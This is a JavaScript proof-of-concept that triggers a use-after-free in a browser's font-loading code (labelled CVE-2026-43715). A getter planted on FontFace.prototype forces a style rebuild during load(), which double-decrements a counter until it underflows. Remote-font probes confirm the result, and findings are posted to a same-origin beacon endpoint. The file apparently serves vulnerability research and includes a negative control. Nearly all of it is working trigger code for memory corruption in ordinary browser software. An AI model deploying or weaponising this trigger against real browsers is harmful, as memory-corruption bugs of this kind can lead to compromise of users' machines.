// p453-fontface-uaf-stateprobe.js — CVE-2026-43715 UAF: double-decrement detection
//
// The UAF causes CSSFontFaceSet::m_activeCount to underflow to UINT_MAX.
// After underflow, loading new fonts never sets CSSFontFaceSet::m_status to Loading
// (incrementActiveCount only sets it when m_activeCount hits 1, not when wrapping
// UINT_MAX → 0).
//
// DETECTION: After the UAF, add a remote-URL font that stays in "loading" state.
// Check document.fonts.status immediately after load():
//   Normal: "loading"  (m_activeCount: 0→1, triggers m_status = Loading)
//   UAF:    "loaded"   (m_activeCount: UINT_MAX→0, skips m_status update)
//
// Mismatch face.status=="loading" + fonts.status=="loaded" = PROOF.
(function() {
    var RUN = 'p453-' + Date.now().toString(36);
    function B(tag, body) {
        try {
            var x = new XMLHttpRequest();
            x.open('POST', '/beacon/' + tag + '/' + RUN, false);
            x.send(typeof body === 'object' ? JSON.stringify(body) : (body || ''));
        } catch(e) {}
    }

    B('BOOT', navigator.userAgent);

    // ═══════════════════════════════════════════════════════════════
    // TEST A: Trigger UAF, then probe with remote font
    // ═══════════════════════════════════════════════════════════════
    try {
        var statusInit = document.fonts.status;

        // Create target face via @font-face (need CSS rule for CSSOM modify)
        var styleA = document.createElement('style');
        styleA.textContent = "@font-face { font-family: 'p453a'; src: local('Arial'); }";
        document.head.appendChild(styleA);
        document.body.offsetHeight;

        var ruleA = styleA.sheet.cssRules[0];

        var faceA = null;
        document.fonts.forEach(function(f) {
            if (f.family.replace(/['"]/g,'') === 'p453a') faceA = f;
        });

        if (!faceA) { B('A-DEAD', 'NO-FACE'); }
        else {
            var thenA = 0, aErr = '';

            Object.defineProperty(FontFace.prototype, 'then', { get: function() {
                thenA++;
                if (thenA > 1) return undefined;
                try {
                    // Trigger adopt: modify CSSOM → offsetHeight → style rebuild
                    // remove() decrements m_activeCount (face status is Loading)
                    // → m_activeCount: 1→0 → completedLoading fires
                    ruleA.style.setProperty('font-weight', 'bold');
                    document.body.offsetHeight;
                } catch(e) { aErr += e.message; }
                return undefined;
            }, configurable: true });

            // load() → pump() → setStatus(Loading) → setStatus(Success)
            // During setStatus(Success) → iterateClients:
            //   FontFace: resolve → getter → adopt → remove → decrement #1 (1→0)
            //   CSSFontFaceSet: fontStateChanged → decrement #2 (0→UINT_MAX)
            faceA.load();
            try { delete FontFace.prototype.then; } catch(e) {}

            B('A-UAF', {
                thenFired: thenA,
                err: aErr,
                faceStatus: faceA.status,
                fontsStatus: document.fonts.status,
                initStatus: statusInit
            });

            // NOW: m_activeCount should be UINT_MAX (double-decrement)
            // Probe with a REMOTE font → stays in Loading state (async fetch)
            // The URL intentionally 404s, but the fetch is async so we have a window
            var probeFace = new FontFace('probeA', "url('/nonexistent-probe-p453a.woff2')");
            document.fonts.add(probeFace);
            probeFace.load();

            // THE KEY CHECK: immediately after load()
            var probeFaceStatus = probeFace.status;
            var probeFontsStatus = document.fonts.status;
            var mismatch = (probeFaceStatus === 'loading' && probeFontsStatus !== 'loading');

            B('A-PROBE', {
                faceStatus: probeFaceStatus,
                fontsStatus: probeFontsStatus,
                mismatch: mismatch,
                verdict: mismatch ? 'DOUBLE-DECREMENT-CONFIRMED' : 'NO-DETECT'
            });

            probeFace.loaded.catch(function(){});
        }
    } catch(e) { B('A-ERR', e.message.slice(0,200)); }


    // ═══════════════════════════════════════════════════════════════
    // TEST B: Second independent UAF trigger + probe
    // Separate from A to confirm reproducibility
    // ═══════════════════════════════════════════════════════════════
    try {
        var styleB = document.createElement('style');
        styleB.textContent = "@font-face { font-family: 'p453b'; src: local('Arial'); }";
        document.head.appendChild(styleB);
        document.body.offsetHeight;

        var ruleB = styleB.sheet.cssRules[0];

        var faceB = null;
        document.fonts.forEach(function(f) {
            if (f.family.replace(/['"]/g,'') === 'p453b') faceB = f;
        });

        if (!faceB) { B('B-DEAD', 'NO-FACE'); }
        else {
            var thenB = 0, bErr = '';

            Object.defineProperty(FontFace.prototype, 'then', { get: function() {
                thenB++;
                if (thenB > 1) return undefined;
                try {
                    ruleB.style.setProperty('font-weight', '900');
                    document.body.offsetHeight;
                } catch(e) { bErr += e.message; }
                return undefined;
            }, configurable: true });

            faceB.load();
            try { delete FontFace.prototype.then; } catch(e) {}

            // Probe
            var probeB = new FontFace('probeB', "url('/nonexistent-probe-p453b.woff2')");
            document.fonts.add(probeB);
            probeB.load();

            var bFaceStatus = probeB.status;
            var bFontsStatus = document.fonts.status;

            B('B-PROBE', {
                thenFired: thenB,
                err: bErr,
                faceStatus: bFaceStatus,
                fontsStatus: bFontsStatus,
                mismatch: (bFaceStatus === 'loading' && bFontsStatus !== 'loading'),
                verdict: (bFaceStatus === 'loading' && bFontsStatus !== 'loading') ? 'CONFIRMED' : 'NO-DETECT'
            });

            probeB.loaded.catch(function(){});
        }
    } catch(e) { B('B-ERR', e.message.slice(0,200)); }


    // ═══════════════════════════════════════════════════════════════
    // TEST C: Negative control — NO UAF, same probe mechanism
    // Shows that without UAF, fonts.status IS "loading" for remote font
    // ═══════════════════════════════════════════════════════════════
    try {
        // Create a face WITHOUT triggering UAF (no thenable getter)
        var styleC = document.createElement('style');
        styleC.textContent = "@font-face { font-family: 'p453c'; src: local('Arial'); }";
        document.head.appendChild(styleC);
        document.body.offsetHeight;

        var faceC = null;
        document.fonts.forEach(function(f) {
            if (f.family.replace(/['"]/g,'') === 'p453c') faceC = f;
        });

        if (faceC) {
            // Normal load — no UAF
            faceC.load();

            var cStatusAfterLocal = document.fonts.status;

            // Now probe with remote font
            var probeC = new FontFace('probeC', "url('/nonexistent-probe-p453c.woff2')");
            document.fonts.add(probeC);
            probeC.load();

            var cFaceStatus = probeC.status;
            var cFontsStatus = document.fonts.status;

            B('C-CONTROL', {
                localFaceStatus: faceC.status,
                statusAfterLocal: cStatusAfterLocal,
                probeFaceStatus: cFaceStatus,
                probeFontsStatus: cFontsStatus,
                mismatch: (cFaceStatus === 'loading' && cFontsStatus !== 'loading')
            });

            probeC.loaded.catch(function(){});
        } else {
            B('C-DEAD', 'NO-FACE');
        }
    } catch(e) { B('C-ERR', e.message.slice(0,200)); }


    // ═══════════════════════════════════════════════════════════════
    // TEST D: Observable size / membership changes from adopt
    // ═══════════════════════════════════════════════════════════════
    try {
        var sizeBefore = document.fonts.size;

        var styleD = document.createElement('style');
        styleD.textContent = "@font-face { font-family: 'p453d'; src: local('Arial'); }";
        document.head.appendChild(styleD);
        document.body.offsetHeight;

        var sizeAfterAdd = document.fonts.size;
        var ruleD = styleD.sheet.cssRules[0];

        var faceD = null;
        document.fonts.forEach(function(f) {
            if (f.family.replace(/['"]/g,'') === 'p453d') faceD = f;
        });

        if (faceD) {
            var thenD = 0;
            Object.defineProperty(FontFace.prototype, 'then', { get: function() {
                thenD++;
                if (thenD > 1) return undefined;
                ruleD.style.setProperty('font-weight', 'bold');
                document.body.offsetHeight;
                return undefined;
            }, configurable: true });

            faceD.load();
            try { delete FontFace.prototype.then; } catch(e) {}

            var sizeAfterUAF = document.fonts.size;
            var faceStillIn = document.fonts.has(faceD);
            var faceDStatus = faceD.status;

            B('D-RESULT', {
                thenFired: thenD,
                sizeBefore: sizeBefore,
                sizeAfterAdd: sizeAfterAdd,
                sizeAfterUAF: sizeAfterUAF,
                faceStillIn: faceStillIn,
                faceStatus: faceDStatus
            });
        } else {
            B('D-DEAD', 'NO-FACE');
        }
    } catch(e) { B('D-ERR', e.message.slice(0,200)); }


    B('ALIVE', 'all-tests-completed');
    B('DONE', RUN);
})();
